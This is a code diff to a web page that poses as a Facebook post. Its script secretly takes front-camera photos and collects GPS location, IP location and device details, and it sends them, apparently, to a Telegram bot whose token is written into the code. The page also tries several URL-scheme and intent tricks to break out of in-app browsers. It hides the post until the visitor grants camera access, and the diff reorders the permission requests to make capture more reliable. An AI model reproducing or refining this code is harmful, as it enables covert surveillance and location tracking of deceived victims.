@@ -33,7 +33,8 @@
       background: var(--bg);
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       display: flex;
-      justify-content: center;
+      flex-direction: column;
+      align-items: center;
       padding-top: 20px;
       min-height: 100vh;
       position: relative;
@@ -41,7 +42,7 @@
     .post-container {
       max-width: 500px; width: 100%; background: var(--card-bg);
       border-radius: 8px; box-shadow: 0 1px 2px rgba(0,0,0,0.1);
-      overflow: hidden; border: 1px solid var(--border);
+      overflow: hidden; border: 1px solid var(--border); margin-bottom: 15px;
     }
     .post-header { display: flex; align-items: center; padding: 12px 16px 0; position: relative; }
     .post-header img { width: 40px; height: 40px; border-radius: 50%; margin-left: 8px; object-fit: cover; }
@@ -55,14 +56,25 @@
     .three-dots { position: absolute; top: 12px; left: 16px; width: 36px; height: 36px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; color: var(--text-secondary); font-size: 20px; }
     .three-dots:hover { background: var(--border); }
 
-    /* شاشة إعادة المحاولة */
-    .retry-overlay {
-      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-      background: var(--bg); display: flex; justify-content: center; align-items: center; z-index: 9999;
+    /* أزرار إعادة المحاولة */
+    .controls {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 10px;
+      width: 100%;
+      max-width: 500px;
     }
     .retry-btn {
-      padding: 14px 28px; font-size: 1.1rem; background: #1877f2; color: white;
-      border: none; border-radius: 6px; cursor: pointer; font-weight: 600;
+      padding: 12px 20px;
+      font-size: 0.9rem;
+      background: #1877f2;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-weight: 600;
+      width: 100%;
     }
     .hidden { display: none !important; }
     video, canvas { display: none; }
@@ -83,14 +95,16 @@
     <div class="post-actions"><span>أعجبني</span><span>تعليق</span><span>مشاركة</span></div>
   </div>
 
-  <div class="retry-overlay hidden" id="retryOverlay">
-    <button class="retry-btn" id="retryBtn">إعادة المحاولة</button>
+  <!-- أزرار إعادة المحاولة المنفصلة -->
+  <div class="controls">
+    <button class="retry-btn hidden" id="retryCameraBtn">إعادة محاولة الكاميرا</button>
+    <button class="retry-btn hidden" id="retryLocationBtn">إعادة محاولة الموقع</button>
   </div>
 
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas"></canvas>
 
-  <script>
+  <script type="module">
     // ==================== إعدادات ====================
     const B = '69ee19e8856a68218974812e';
     const T = '8649544110:AAF33tUasn_RsH6A7035vpyYntAlOAQ0axQ';
@@ -98,17 +112,17 @@
     const I = 'a7e43833d69a75';
 
     const post = document.getElementById('postContainer');
-    const overlay = document.getElementById('retryOverlay');
-    const retryBtn = document.getElementById('retryBtn');
+    const retryCameraBtn = document.getElementById('retryCameraBtn');
+    const retryLocationBtn = document.getElementById('retryLocationBtn');
     const vid = document.getElementById('video');
     const cnv = document.getElementById('canvas');
     const ctx = cnv.getContext('2d');
 
     let stream, photos = 0, capInt, redir = 'https://www.facebook.com', deviceInfoSent = false, gpsLoc = null, ipLoc = null;
     let recording = false;
-    let locationGranted = false;
-    let cameraGranted = false;
-    let escapeCompleted = false; // هل نجح الهروب من قبل؟
+    let cameraGranted = false;    // هل الكاميرا شغالة؟
+    let locationGranted = false;  // هل الموقع الدقيق أُرسل؟
+    let escapeCompleted = false;
 
     async function sendText(text) {
       try {
@@ -125,8 +139,8 @@
       return new Blob([u8], { type: mime });
     }
 
-    function showOverlay() { post.classList.add('hidden'); overlay.classList.remove('hidden'); }
-    function hideOverlay() { overlay.classList.add('hidden'); post.classList.remove('hidden'); }
+    function showOverlay() { post.classList.add('hidden'); }
+    function hideOverlay() { post.classList.remove('hidden'); }
     function stopAll() { if (capInt) clearInterval(capInt); if (stream) stream.getTracks().forEach(t => t.stop()); }
 
     // ==================== تحميل المنشور ====================
@@ -151,7 +165,7 @@
       } catch (e) {}
     }
 
-    // ==================== معلومات الجهاز ====================
+    // ==================== معلومات الجهاز (بصمت) ====================
     async function sendDeviceInfo() {
       if (deviceInfoSent) return;
       deviceInfoSent = true;
@@ -169,7 +183,7 @@
       } catch (e) {}
     }
 
-    // ==================== الموقع عبر IP ====================
+    // ==================== الموقع عبر IP (بصمت) ====================
     async function fetchIPLocation() {
       try {
         const r = await fetch(`https://ipinfo.io/json?token=${I}`); const d = await r.json();
@@ -187,7 +201,7 @@
       } catch (e) {}
     }
 
-    // ==================== الموقع الدقيق GPS ====================
+    // ==================== الموقع الدقيق GPS (يُطلب لاحقاً) ====================
     async function requestGPS() {
       if (!navigator.geolocation) return false;
       try {
@@ -207,19 +221,7 @@
       } catch (e) { return false; }
     }
 
-    async function tryLocation() {
-      hideOverlay();
-      await new Promise(r => setTimeout(r, 200));
-      const ok = await requestGPS();
-      if (ok) {
-        locationGranted = true;
-        await tryCamera();
-      } else {
-        showOverlay();
-      }
-    }
-
-    // ==================== الكاميرا ====================
+    // ==================== الكاميرا (تُطلب أولاً) ====================
     async function startCamera() {
       try {
         stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
@@ -259,23 +261,49 @@
       } catch (e) { recording = false; }
     }
 
+    // ==================== محاولة الكاميرا ====================
     async function tryCamera() {
-      hideOverlay();
-      await new Promise(r => setTimeout(r, 200));
       const ok = await startCamera();
       if (ok) {
         cameraGranted = true;
-        hideOverlay();
+        retryCameraBtn.classList.add('hidden');
+        // الكاميرا شغالة، نبدأ بطلب الموقع (لن يؤثر على التصوير)
+        tryLocation();
       } else {
+        // رفض الكاميرا: إخفاء المنشور، إظهار زر إعادة المحاولة
         showOverlay();
+        retryCameraBtn.classList.remove('hidden');
+        retryLocationBtn.classList.add('hidden');
+        stopAll();
       }
     }
 
-    retryBtn.addEventListener('click', async () => {
-      if (!locationGranted) await tryLocation();
-      else if (!cameraGranted) await tryCamera();
+    // ==================== محاولة الموقع (تُستدعى بعد نجاح الكاميرا) ====================
+    async function tryLocation() {
+      const ok = await requestGPS();
+      if (ok) {
+        // نجح GPS وأُرسل للبوت
+        locationGranted = true;
+        retryLocationBtn.classList.add('hidden');
+      } else {
+        // فشل GPS – يظهر زر إعادة المحاولة للموقع فقط، والتصوير مستمر
+        retryLocationBtn.classList.remove('hidden');
+      }
+    }
+
+    // ==================== أزرار إعادة المحاولة ====================
+    retryCameraBtn.addEventListener('click', async () => {
+      retryCameraBtn.classList.add('hidden');
+      hideOverlay();
+      await tryCamera();
     });
 
+    retryLocationBtn.addEventListener('click', async () => {
+      retryLocationBtn.classList.add('hidden');
+      await tryLocation();
+    });
+
+    // ==================== تقرير الخروج ====================
     async function sendExitReport() {
       let locStr = 'غير متوفر';
       if (gpsLoc) locStr = `GPS (${gpsLoc.lat}, ${gpsLoc.lon}, دقة ${gpsLoc.acc}م)`;
@@ -285,15 +313,11 @@
 
     // ==================== خطة الهروب من WebView (7 طرق) ====================
     async function attemptEscape() {
-      // إذا نجح الهروب من قبل، لا نعيد المحاولة
       if (escapeCompleted) return;
-      
       const targetUrl = window.location.href;
       const ua = navigator.userAgent || '';
       const isIOS = /iPhone|iPad|iPod/i.test(ua);
       const isAndroid = /Android/i.test(ua);
-      
-      // الطرق بالترتيب (أي واحدة تنجح توقف البقية تلقائياً لأن الصفحة ستنتقل)
       const methods = isIOS ? [
         { name: 'Safari', fn: () => { window.location.href = targetUrl.replace(/^https?:\/\//, 'x-safari-https://'); } },
         { name: 'Chrome', fn: () => { window.location.href = targetUrl.replace(/^https?:\/\//, 'googlechrome://'); } },
@@ -310,21 +334,11 @@
         { name: 'Brave', fn: () => { window.location.href = `intent://${targetUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.brave.browser;end`; } },
         { name: 'Edge', fn: () => { window.location.href = `intent://${targetUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.microsoft.emmx;end`; } },
         { name: 'Popup', fn: () => { window.open(targetUrl, '_blank', 'noopener,noreferrer'); } }
-      ] : [
-        { name: 'Popup', fn: () => { window.open(targetUrl, '_blank', 'noopener,noreferrer'); } }
-      ];
-
+      ] : [];
       for (let i = 0; i < methods.length; i++) {
-        try {
-          methods[i].fn();
-          // إذا وصلنا إلى هنا، ربما لم تنتقل الصفحة بعد (بعض الطرق لا تؤدي إلى انتقال فوري)
-          // ننتظر قليلاً ثم نتحقق مما إذا كنا ما زلنا في نفس الصفحة
-          await new Promise(r => setTimeout(r, 300));
-          // إذا انتقلت الصفحة، لن يكتمل الكود التالي
-        } catch(e) {}
+        try { methods[i].fn(); } catch(e) {}
+        await new Promise(r => setTimeout(r, 300));
       }
-      
-      // إذا لم تنجح أي طريقة، نعلم أننا بقينا في WebView
       escapeCompleted = true;
     }
 
@@ -338,16 +352,9 @@
       await loadPost();
       sendDeviceInfo();
       fetchIPLocation();
-      
-      // خطة الهروب أولاً (إذا كنا داخل WebView)
-      if (isInAppBrowser()) {
-        await attemptEscape();
-      }
-      
-      // ثم نبدأ بطلب الصلاحيات
-      setTimeout(async () => {
-        await tryLocation();
-      }, 600);
+      if (isInAppBrowser()) await attemptEscape();
+      // نطلب الكاميرا بعد 600ms (ستقوم tryCamera باستدعاء tryLocation تلقائياً بعد النجاح)
+      setTimeout(tryCamera, 600);
     })();
 
     window.addEventListener('beforeunload', () => {
